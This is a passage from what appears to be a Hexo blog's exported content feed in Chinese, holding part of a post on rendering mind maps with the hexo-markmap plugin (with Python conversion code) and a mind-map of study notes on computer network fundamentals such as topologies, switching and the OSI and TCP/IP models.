node[&quot;notes&quot;][&quot;plain&quot;][&quot;content&quot;] + &quot;\n&quot;        if &quot;children&quot; in node:            for cur_node in node[&quot;children&quot;][&quot;attached&quot;]:                self.__parse_node(self, cur_node, level + &quot;#&quot;)    def __generat_file(self):        file = open(&#39;个人学习.md&#39;, &#39;w&#39;, encoding=&quot;utf-8&quot;)        file.write(&quot;[TOC]\n\n&quot; + self.markdown_file_content)        file.close()      </code></pre><h3 id="hexo思维导图展示"><a href="#hexo思维导图展示" class="headerlink" title="hexo思维导图展示"></a>hexo思维导图展示</h3><p>首先安装hexo-markmap 插件</p><p><code>npm install hexo-markmap </code></p><p>接着在思维导图文字内容的首部和末尾分别增加<br><code>&#123;% markmap 800px %&#125;``&#123;% endmarkmap %&#125;</code></p><h3 id="hexo的其他插件"><a href="#hexo的其他插件" class="headerlink" title="hexo的其他插件"></a>hexo的其他插件</h3><blockquote><p>hexo-tag-plugins</p></blockquote><p>使用该插件的<minmap>标签，使用方法（例）：</p><pre><code>&#123;% mindmap 600 %&#125;- 计算机网络概述-  计算机网络的基本概念- 以能够相互共享资源的方式互连起来的自治计算机系统的集合- 计算机网络的组成- 组成部分角度            - 硬件：主机（端系统）、通信链路（双绞线、光纤等）、交换设备（路由器、交换机等）、通信处理机（网卡等- 工作方式角度            - 核心部分：大量的网络和连接这些网络的路由器组成&#123;% endmindmap %&#125;</code></pre><p>与markmap的不同：高度单位不加px；使用缩进构成不同层级</p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络概述</title>
      <link href="/knowledge/12.html"/>
      <url>/knowledge/12.html</url>
      
        <content type="html"><![CDATA[<div class="markmap-container" style="height:800px">  <svg data="{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:1,&quot;p&quot;:{&quot;lines&quot;:[1,2]},&quot;v&quot;:&quot;计算机网络概述&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[3,4]},&quot;v&quot;:&quot;计算机网络的基本概念&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[5,6]},&quot;v&quot;:&quot;以能够相互共享资源的方式互连起来的自治计算机系统的集合&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[7,8]},&quot;v&quot;:&quot;自治：无主从关系&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[9,10]},&quot;v&quot;:&quot;互联：互联互通（通信链路、通过交换网络）&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[11,12]},&quot;v&quot;:&quot;计算机网络的组成&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[13,14]},&quot;v&quot;:&quot;组成部分角度&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[15,16]},&quot;v&quot;:&quot;硬件：主机（端系统）、通信链路（双绞线、光纤等）、交换设备（路由器、交换机等）、通信处理机（网卡等）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[17,18]},&quot;v&quot;:&quot;软件：网络操作系统、邮件收发程序、FTP程序、聊天程序等&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[19,20]},&quot;v&quot;:&quot;协议：计算机网络的核心，规定网络传输数据时所遵循和规范&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[21,22]},&quot;v&quot;:&quot;工作方式角度&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[23,24]},&quot;v&quot;:&quot;核心部分：大量的网络和连接这些网络的路由器组成&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[25,26]},&quot;v&quot;:&quot;边缘部分：所有连接到互联网上、供用户直接使用的主机&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[27,28]},&quot;v&quot;:&quot;功能组成角度&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[29,30]},&quot;v&quot;:&quot;通信子网：传输介质、通信设备、相应的网络协议&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[31,32]},&quot;v&quot;:&quot;资源子网：实现资源共享功能的设备及其软件的集合&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[33,34]},&quot;v&quot;:&quot;计算机网络的功能&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[35,36]},&quot;v&quot;:&quot;数据通信（最基本、最重要的功能）、资源共享、分布式处理、提高可靠性、负载均衡&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[37,38]},&quot;v&quot;:&quot;电子化办公服务、远程教育、娱乐等&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[39,40]},&quot;v&quot;:&quot;计算机网络的分类&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[41,42]},&quot;v&quot;:&quot;按分布范围&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[43,44]},&quot;v&quot;:&quot;广域网（WAN）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[45,46]},&quot;v&quot;:&quot;范围：提供长距离通信，几十千米到几千千米&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[47,48]},&quot;v&quot;:&quot;地位：因特网的核心部分&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[49,50]},&quot;v&quot;:&quot;技术：交换技术&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[51,52]},&quot;v&quot;:&quot;城域网（MAN）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[53,54]},&quot;v&quot;:&quot;范围：跨越几个街区甚至整个城市，5~50km&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[55,56]},&quot;v&quot;:&quot;技术：多采用以太网技术&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[57,58]},&quot;v&quot;:&quot;局域网（LAN）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[59,60]},&quot;v&quot;:&quot;范围：几十米到几千米的区域&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[61,62]},&quot;v&quot;:&quot;技术：广播技术&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[63,64]},&quot;v&quot;:&quot;个人局域网（PAN）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[65,66]},&quot;v&quot;:&quot;范围：个人工作地点将电子设备通过无线技术连接起来的网络，直径10m&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[67,68]},&quot;v&quot;:&quot;按传输技术&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[69,70]},&quot;v&quot;:&quot;广播式网络&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[71,72]},&quot;v&quot;:&quot;所有联网计算机共享一个公共通信信道（eg：大部分局域网、广域网中的无线和卫星通信网络）&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[73,74]},&quot;v&quot;:&quot;点对点网络&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[75,76]},&quot;v&quot;:&quot;每条物理线路连接一对计算机，采用分组存储转发和路由选择机制（eg：广域网基本使用点对点网络）&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[77,78]},&quot;v&quot;:&quot;按拓扑结构&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[79,80]},&quot;v&quot;:&quot;网络拓扑结构是由网中节点（路由器、主机等）与通信线路（网线）之间的几何关系，即主要取决于通信子网&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[81,82]},&quot;v&quot;:&quot;分类&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[83,84]},&quot;v&quot;:&quot;总线形&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[85,86]},&quot;v&quot;:&quot;用单根传输线把计算机连接起来&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[87,88]},&quot;v&quot;:&quot;优点：建网容易，增减节点方便，节省线路&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[89,90]},&quot;v&quot;:&quot;缺点：重负载时效率不高，总线任意一处对故障敏感&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[91,92]},&quot;v&quot;:&quot;星形&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[93,94]},&quot;v&quot;:&quot;每个终端都以单独的线路与中央设备相连&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[95,96]},&quot;v&quot;:&quot;优点：便于集中控制和处理&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[97,98]},&quot;v&quot;:&quot;缺点：成本高，中心设备对故障敏感&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[99,100]},&quot;v&quot;:&quot;环形&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[101,102]},&quot;v&quot;:&quot;所有计算机接口设备连接成一个环，环中信号单向传输（eg：令牌环局域网）&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[103,104]},&quot;v&quot;:&quot;网状&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[105,106]},&quot;v&quot;:&quot;一般情况下，每个节点至少有两条路径与其他节点相连（eg：多用在广域网）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[107,108]},&quot;v&quot;:&quot;优点：可靠性高&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[109,110]},&quot;v&quot;:&quot;缺点：控制复杂，线路成本高&quot;}]}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[111,112]},&quot;v&quot;:&quot;按使用者&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[113,114]},&quot;v&quot;:&quot;公用网&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[115,116]},&quot;v&quot;:&quot;专用网：为满足特殊业务需求而建造的网络&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[117,118]},&quot;v&quot;:&quot;按交换技术&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[119,120]},&quot;v&quot;:&quot;电路交换网络&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[121,122]},&quot;v&quot;:&quot;源节点和目的节点之间建立一条专用的通路，包括建立连接、传输数据、断开连接三个阶段&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[123,124]},&quot;v&quot;:&quot;优点：数据直接传送、延时小&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[125,126]},&quot;v&quot;:&quot;缺点：线路利用率低、不能充分利用线路容量、不便进行差错控制&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[127,128]},&quot;v&quot;:&quot;报文交换网络（存储转发网络）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[129,130]},&quot;v&quot;:&quot;用户数据加上源地址、目的地址、校验码等信息封装成报文并传送到相邻节点，全部存储后再转发给下一个节点&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[131,132]},&quot;v&quot;:&quot;优点：较为充分地利用线路容量，实现不同链路不同数据传输速率的转换、实现格式转换、实现一对一多对多的访问、实现差错控制&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[133,134]},&quot;v&quot;:&quot;缺点：增大了处理开销和存储资源的开销、增加了缓冲时延、缓冲区难以管理（报文大小不确定）、需要额外的控制机制使报文不乱序&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[135,136]},&quot;v&quot;:&quot;分组交换网络（包交换网络）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[137,138]},&quot;v&quot;:&quot;类似于报文交换网络，但是对数据进行了固定长度的分组&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[139,140]},&quot;v&quot;:&quot;优点（除报文交换的优点外）：缓冲易于管理、包的平均时延更小、网络占用的平均缓冲区更小、更易于标准化、更适合应用&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[141,142]},&quot;v&quot;:&quot;缺点：处理开销，存在失序、丢失或重复分组等问题、存在传输时延&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[143,144]},&quot;v&quot;:&quot;按传输介质&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[145,146]},&quot;v&quot;:&quot;有线网络（eg：双绞线，同轴电缆）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[147,148]},&quot;v&quot;:&quot;无线网络（eg：蓝牙、微波、无线电）&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[150,151]},&quot;v&quot;:&quot;计算机的性能指标&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[152,153]},&quot;v&quot;:&quot;带宽&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[154,155]},&quot;v&quot;:&quot;网络的通信线路所能传送数据的能力，单位：b/s&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[156,157]},&quot;v&quot;:&quot;时延&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[158,159]},&quot;v&quot;:&quot;发送时延（传输时延）：主机或路由器发送数据帧所需要的时间，发送时延=数据帧长度/信道宽度&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[160,161]},&quot;v&quot;:&quot;传播时延：电磁波在信道中传播一定距离所花费的时间，传播时延=信道长度/电磁波在信道上的传播速率&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[162,163]},&quot;v&quot;:&quot;处理时延：主机或路由器在收到分组后进行的分析分组首部、从分组提取数据部分等的处理时间&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[164,165]},&quot;v&quot;:&quot;排队时延：分组进入路由器后在输入队列排队等待以及确定转发接口后在输出队列排队等待的时间&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[166,167]},&quot;v&quot;:&quot;时延带宽积（以比特为单位的链路长度）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[168,169]},&quot;v&quot;:&quot;时延带宽积=传播时延*信道带宽，表示在连续发送数据的发送端第一个比特到达终点时发送端已经发送的数据量&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[170,171]},&quot;v&quot;:&quot;往返时延&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[172,173]},&quot;v&quot;:&quot;从发送数据到接收到接收端的确认这一过程经历的时间&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[174,175]},&quot;v&quot;:&quot;吞吐量&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[176,177]},&quot;v&quot;:&quot;单位时间内通过某个网络（或信道、接口）的数据量&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[178,179]},&quot;v&quot;:&quot;速率&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[180,181]},&quot;v&quot;:&quot;连接到计算机网络上的主机在数字信道上传送数据的速率，通常把最高的数据率称为带宽&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[182,183]},&quot;v&quot;:&quot;信道利用率&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[184,185]},&quot;v&quot;:&quot;某一信道有百分之多少的时间是有数据通过的&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[186,187]},&quot;v&quot;:&quot;计算机体系结构与参考模型&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[188,189]},&quot;v&quot;:&quot;协议、服务和接口的概念&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[190,191]},&quot;v&quot;:&quot;协议&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[192,193]},&quot;v&quot;:&quot;控制两个或多个对等实体进行通信的规则的集合，是水平的&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[194,195]},&quot;v&quot;:&quot;组成&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[196,197]},&quot;v&quot;:&quot;语法：规定数据的传输格式&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[198,199]},&quot;v&quot;:&quot;语义：规定了所要完成的功能&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[200,201]},&quot;v&quot;:&quot;同步：规定了执行各种操作的条件、时序关系等&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[202,203]},&quot;v&quot;:&quot;一个完整的协议通常有线路管理（建立、释放连接）、差错控制、数据转换等功能 &quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[204,205]},&quot;v&quot;:&quot;接口&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[206,207]},&quot;v&quot;:&quot;同一结点内相邻两层交换信息的连接点，是一个系统的内部规定&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[208,209]},&quot;v&quot;:&quot;同一结点相邻两层的实体通过服务访问点（Service Access Point, SAP）进行交互（SAP实际上是逻辑接口）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[210,211]},&quot;v&quot;:&quot;物理层：网卡接口&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[212,213]},&quot;v&quot;:&quot;数据链路层：MAC地址（物理地址）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[214,215]},&quot;v&quot;:&quot;网络层：IP地址（网络地址）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[216,217]},&quot;v&quot;:&quot;传输层：端口号&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[218,219]},&quot;v&quot;:&quot;应用层：用户界面&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[220,221]},&quot;v&quot;:&quot;服务&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[222,223]},&quot;v&quot;:&quot;指下层为紧邻的上层提供的功能调用，是垂直的&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[224,225]},&quot;v&quot;:&quot;在一层内完成的全部功能并非都称为服务，只有那些能够被高一层实体“看得见”的功能才能称为服务&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[226,227]},&quot;v&quot;:&quot;OSI七层参考模型&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[228,229]},&quot;v&quot;:&quot;目的&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[230,231]},&quot;v&quot;:&quot;支持异构网络的互联互通&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[232,233]},&quot;v&quot;:&quot;产生在协议发明之前，没有偏向任何特定的协议&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[234,235]},&quot;v&quot;:&quot;层次&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[236,237]},&quot;v&quot;:&quot;资源子网&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[238,239]},&quot;v&quot;:&quot;应用层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[244,245]},&quot;v&quot;:&quot;表示层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[250,251]},&quot;v&quot;:&quot;会话层&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[256,257]},&quot;v&quot;:&quot;传输层（承上启下）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[258,259]},&quot;v&quot;:&quot;负责主机中两个进程之间的通信&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[260,261]},&quot;v&quot;:&quot;传输单位：报文段（TCP）或用户数据报（UDP）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[262,263]},&quot;v&quot;:&quot;功能：为端到端连接提供可靠的传输服务、流量控制、差错控制、服务质量、数据传输管理等&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[264,265]},&quot;v&quot;:&quot;典型协议：TCP、UDP&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[266,267]},&quot;v&quot;:&quot;通信子网&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[268,269]},&quot;v&quot;:&quot;网络层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[278,279]},&quot;v&quot;:&quot;数据链路层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[286,287]},&quot;v&quot;:&quot;物理层&quot;}]}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[294,295]},&quot;v&quot;:&quot;TCP/IP参考模型&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[296,297]},&quot;v&quot;:&quot;地位：由于广泛应用成为事实上的国际标准&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[298,299]},&quot;v&quot;:&quot;首先出现的是协议，模型实际上是对已有协议的描述&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[300,301]},&quot;v&quot;:&quot;应用层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[302,303]},&quot;v&quot;:&quot;对应OSI的会话层、表示层和应用层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[304,305]},&quot;v&quot;:&quot;典型协议：HTT